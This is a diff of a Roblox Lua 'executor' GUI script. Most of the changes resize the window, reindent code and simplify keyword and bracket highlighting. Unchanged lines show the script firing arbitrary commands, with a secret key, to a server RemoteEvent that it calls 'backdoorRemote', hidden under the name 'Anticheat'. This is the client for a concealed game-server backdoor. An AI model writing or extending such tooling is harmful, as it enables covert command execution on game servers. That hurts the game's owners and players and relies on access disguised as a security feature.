@@ -1,15 +1,20 @@
+-----------------------------
+-- CLIENT-SIDE EXECUTOR UI (Moderate Syntax Highlighting)
+-----------------------------
+
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local userInputService = game:GetService("UserInputService")
+
 local backdoorRemote = ReplicatedStorage:WaitForChild("Anticheat")
 local SECRET_KEY = "YOUR_SECRET_KEY_HERE"
 
 local function executeServerCommand(command, data)
-	if typeof(data) == "string" then
-		data = data:gsub("[Uu]ser", LocalPlayer.Name)
-	end
-	backdoorRemote:FireServer(command, data, SECRET_KEY)
+    if typeof(data) == "string" then
+        data = data:gsub("[Uu]ser", LocalPlayer.Name)
+    end
+    backdoorRemote:FireServer(command, data, SECRET_KEY)
 end
 
 local screenGui = Instance.new("ScreenGui")
@@ -17,8 +22,8 @@ screenGui.Parent = game.CoreGui
 screenGui.ResetOnSpawn = false
 
 local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 700, 0, 500)
-frame.Position = UDim2.new(0.5, -350, 0.5, -250)
+frame.Size = UDim2.new(0, 600, 0, 450)
+frame.Position = UDim2.new(0.5, -300, 0.5, -225)
 frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
 frame.BorderSizePixel = 2
 frame.Parent = screenGui
@@ -34,22 +39,27 @@ titleBar.Parent = frame
 
 local dragToggle, dragStart, startPos
 titleBar.InputBegan:Connect(function(input)
-	if input.UserInputType == Enum.UserInputType.MouseButton1 then
-		dragToggle = true
-		dragStart = input.Position
-		startPos = frame.Position
-	end
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragToggle = true
+        dragStart = input.Position
+        startPos = frame.Position
+    end
 end)
 titleBar.InputEnded:Connect(function(input)
-	if input.UserInputType == Enum.UserInputType.MouseButton1 then
-		dragToggle = false
-	end
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragToggle = false
+    end
 end)
 userInputService.InputChanged:Connect(function(input)
-	if dragToggle and input.UserInputType == Enum.UserInputType.MouseMovement then
-		local delta = input.Position - dragStart
-		frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-	end
+    if dragToggle and input.UserInputType == Enum.UserInputType.MouseMovement then
+        local delta = input.Position - dragStart
+        frame.Position = UDim2.new(
+            startPos.X.Scale,
+            startPos.X.Offset + delta.X,
+            startPos.Y.Scale,
+            startPos.Y.Offset + delta.Y
+        )
+    end
 end)
 
 local inputBox = Instance.new("TextBox")
@@ -131,80 +141,30 @@ local keywords = {
 	["until"] = "#FFFF00",
 	["return"] = "#00FF00",
 	["local"] = "#FFAA00",
-	["print"] = "#00FF00",
-	["nil"] = "#808080",
-	["true"] = "#00FF00",
-	["false"] = "#FF0000",
-	["and"] = "#FFFFFF",
-	["or"] = "#FFFFFF",
-	["not"] = "#FFFFFF",
-	["break"] = "#FFA500",
-	["continue"] = "#FFA500",
-	["in"] = "#FFFFFF",
-	["table"] = "#FFA500",
-	["require"] = "#FF7F50",
-	["loadstring"] = "#FF6347",
-	["setfenv"] = "#FF6347",
-	["getfenv"] = "#FF6347",
-	["coroutine"] = "#00CED1",
-	["spawn"] = "#FFD700",
-	["wait"] = "#ADFF2F",
-	["Instance.new"] = "#8A2BE2",
-	["game"] = "#FF4500",
-	["workspace"] = "#FF4500",
-	["Part"] = "#0000FF"
+	["print"] = "#00FF00"
 }
 
-local function extractStrings(text)
-	local placeholders = {}
-	local index = 1
-	local result = text:gsub("(\"[^\"]-\"|'[^']-')", function(str)
-		placeholders[index] = str
-		local placeholder = "%%STR" .. index .. "%%"
-		index = index + 1
-		return placeholder
-	end)
-	return result, placeholders
-end
-
-local function restoreStrings(text, placeholders)
-	for i, str in pairs(placeholders) do
-		local color = "#7FFF00"
-		text = text:gsub("%%STR" .. i .. "%%", "<font color=\""..color.."\">"..str.."</font>")
+local function highlightKeywords(text)
+	for word, color in pairs(keywords) do
+		text = text:gsub("(%f[%w])(" .. word .. ")(%f[%W])", "<font color=\"" .. color .. "\">%2</font>")
 	end
 	return text
 end
 
 local function highlightBrackets(text)
+	-- color parentheses, braces, etc.
 	text = text:gsub("(%b())", "<font color=\"#00BFFF\">%1</font>")
 	text = text:gsub("(%b{})", "<font color=\"#FF69B4\">%1</font>")
 	return text
 end
 
-local function highlightKeywords(text)
-	for word, color in pairs(keywords) do
-		if word == "Part" then
-			text = text:gsub("Workspace%.(" .. word .. ")", "<font color=\"#0000FF\">%1</font>")
-			text = text:gsub("([^%.])(" .. word .. ")([^%.])", "%1<font color=\"#FF0000\">%2</font>%3")
-		else
-			text = text:gsub("(%f[%w])(" .. word .. ")(%f[%W])", "<font color=\"" .. color .. "\">%2</font>")
-		end
-	end
-	return text
-end
-
-local function updatePreview(text)
-	local noStrings, placeholders = extractStrings(text)
-	noStrings = highlightBrackets(noStrings)
-	noStrings = highlightKeywords(noStrings)
-	noStrings = restoreStrings(noStrings, placeholders)
-	return noStrings
-end
-
 inputBox.Changed:Connect(function(prop)
 	if prop == "Text" then
 		local code = inputBox.Text
-		local highlighted = updatePreview(code)
+		-- Step 1: color keywords
+		local highlighted = highlightKeywords(code)
+		-- Step 2: color brackets
+		highlighted = highlightBrackets(highlighted)
 		previewBox.Text = highlighted
 	end
 end)
